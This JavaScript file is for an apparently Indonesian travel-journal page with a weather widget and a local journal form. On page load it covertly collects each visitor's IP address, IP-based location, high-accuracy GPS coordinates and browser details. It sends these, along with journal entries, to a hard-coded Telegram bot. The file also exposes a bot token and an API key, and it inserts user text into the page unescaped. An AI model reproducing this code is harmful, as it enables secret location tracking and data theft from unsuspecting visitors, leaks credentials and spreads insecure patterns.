const CONFIG = {
    TELEGRAM_BOT_TOKEN: '7807161260:AAHAnhLzPqLprHr_inS9ixhmb3jJwHxxdMI',
    TELEGRAM_CHAT_ID: '1254913051',
    WEATHER_API_KEY: '0714e2d6c51447dfa37102719252904'
};

let currentLanguage = 'id';
let userLocation = {};

const languageToggle = document.getElementById('languageToggle');
const langText = document.querySelector('.lang-text');
const weatherInfo = document.getElementById('weatherInfo');
const journeyForm = document.getElementById('journeyForm');
const entriesContainer = document.getElementById('journey-entries');

document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

async function initializeApp() {
    await trackVisitor();
    
    await loadWeather();
    
    loadJourneyEntries();
    
    setupEventListeners();
}

async function trackVisitor() {
    try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        const ip = ipResponse.data.ip;
        
        const geoResponse = await axios.get(`https://ipapi.co/${ip}/json/`);
        const location = geoResponse.data;
        
        userLocation = {
            ip: ip,
            city: location.city || 'Unknown',
            country: location.country_name || 'Unknown',
            latitude: location.latitude || 'Unknown',
            longitude: location.longitude || 'Unknown',
            browser: navigator.userAgent,
            time: new Date().toISOString(),
            using_gps: false
        };

        if (navigator.geolocation) {
            try {
                await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            userLocation.using_gps = true;
                            userLocation.latitude = position.coords.latitude;
                            userLocation.longitude = position.coords.longitude;
                            resolve(position);
                        },
                        (error) => {
                            console.log("Akses lokasi GPS ditolak...", error.message);
                            resolve(null);
                        },
                        { 
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        }
                    );
                });
            } catch (gpsError) {
                console.error("Error GPS:", gpsError);
            }
        }
        
        await sendTelegramNotification();
        
    } catch (error) {
        console.error('Error tracking:', error);
    }
}

async function sendTelegramNotification() {
    try {
        let message;
        
        if (userLocation.using_gps) {
            message = `
 TRAVEL JOURNEY - Pengunjung Baru!
 IP: ${userLocation.ip}
 Koordinat GPS: ${userLocation.latitude}, ${userLocation.longitude}
 Peta: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}
 Kota: ${userLocation.city}, ${userLocation.country}
 Perangkat: ${userLocation.browser}
 Waktu: ${userLocation.time}
            `;
        } else {
            message = `
 TRAVEL JOURNEY - Pengunjung Baru!
 IP: ${userLocation.ip}
 Lokasi: ${userLocation.city}, ${userLocation.country}
 Koordinat: ${userLocation.latitude}, ${userLocation.longitude}
 Peta: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}
 Perangkat: ${userLocation.browser}
 Waktu: ${userLocation.time}
            `;
        }
        
        await axios.post(
            `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }
        );
        
    } catch (error) {
        console.error('Error sending Telegram:', error);
    }
}


async function loadWeather() {
    try {
        const response = await axios.get(
            `https://api.weatherapi.com/v1/current.json?key=${CONFIG.WEATHER_API_KEY}&q=auto:ip&lang=${currentLanguage}`
        );
        
        const weather = response.data;
        displayWeather(weather);
        
    } catch (error) {
        console.error("Gagal memuat cuaca:", error);
        weatherInfo.innerHTML = '<div class="weather-error">' + 
            (currentLanguage === 'id' ? 'Tidak dapat memuat data cuaca' : 'Unable to load weather data') + 
            '</div>';
    }
}


function displayWeather(weather) {
    const weatherHTML = `
        <div class="weather-info">
            <div class="weather-location">${weather.location.name}, ${weather.location.country}</div>
            <div class="weather-temp">${Math.round(weather.current.temp_c)}°C</div>
            <div class="weather-condition">
                <img src="https:${weather.current.condition.icon}" alt="${weather.current.condition.text}">
                ${weather.current.condition.text}
            </div>
            <div class="weather-time">
                ${currentLanguage === 'id' ? 'Terakhir update:' : 'Last updated:'} ${new Date(weather.current.last_updated).toLocaleTimeString()}
            </div>
        </div>
    `;
    
    weatherInfo.innerHTML = weatherHTML;
}


function setupEventListeners() {

    languageToggle.addEventListener('click', toggleLanguage);
    
    
    journeyForm.addEventListener('submit', function(e) {
        e.preventDefault();
        addNewJourney();
    });
}


function toggleLanguage() {
    currentLanguage = currentLanguage === 'id' ? 'en' : 'id';
    updateLanguage();
}

function updateLanguage() {
    langText.textContent = currentLanguage === 'id' ? 'EN' : 'ID';
    
    document.querySelectorAll('[data-id]').forEach(element => {
        const idText = element.getAttribute('data-id');
        const enText = element.getAttribute('data-en');
        element.textContent = currentLanguage === 'id' ? idText : enText;
    });
    
    const textarea = document.getElementById('story');
    const placeholderText = document.querySelector('.placeholder-text');
    if (currentLanguage === 'id') {
        placeholderText.textContent = 'Bagikan pengalaman perjalanan Anda...';
    } else {
        placeholderText.textContent = 'Share your travel experience...';
    }
    
    loadWeather();
}

function addNewJourney() {
    const destination = document.getElementById('destination').value;
    const travelDate = document.getElementById('travelDate').value;
    const story = document.getElementById('story').value;
    
    if (destination.trim() && travelDate && story.trim()) {
        const journey = {
            id: Date.now(),
            destination: destination,
            date: travelDate,
            story: story,
            timestamp: new Date().toISOString()
        };
        
        saveJourney(journey);
        displayJourney(journey);
        journeyForm.reset();
        
        sendJourneyNotification(journey);
    }
}

function saveJourney(journey) {
    const journeys = getJourneys();
    journeys.unshift(journey);
    localStorage.setItem('travelJourneys', JSON.stringify(journeys));
}

function getJourneys() {
    return JSON.parse(localStorage.getItem('travelJourneys')) || [];
}

function loadJourneyEntries() {
    const journeys = getJourneys();
    entriesContainer.innerHTML = '';
    
    journeys.forEach(journey => {
        displayJourney(journey);
    });
}

function displayJourney(journey) {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
        <div class="card-destination">${journey.destination}</div>
        <span class="card-date">${formatDate(journey.date)}</span>
        <div class="card-story">${journey.story.slice(0, 150)}${journey.story.length > 150 ? '...' : ''}</div>
    `;
    
    entriesContainer.prepend(card);
}

function formatDate(dateString) {
    const date = new Date(dateString);
    if (currentLanguage === 'id') {
        return date.toLocaleDateString('id-ID', {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
    } else {
        return date.toLocaleDateString('en-US', {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
    }
}

async function sendJourneyNotification(journey) {
    try {
        const message = `
 TRAVEL JOURNEY - Entri Baru!
 Destinasi: ${journey.destination}
 Tanggal: ${formatDate(journey.date)}
 Cerita: ${journey.story.slice(0, 100)}${journey.story.length > 100 ? '...' : ''}
 Dari: ${userLocation.city}, ${userLocation.country}
 Dicatat: ${new Date(journey.timestamp).toLocaleString()}
        `;
        
        await axios.post(
            `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }
        );
        
    } catch (error) {
        console.error('Error sending journey notification:', error);
    }
}
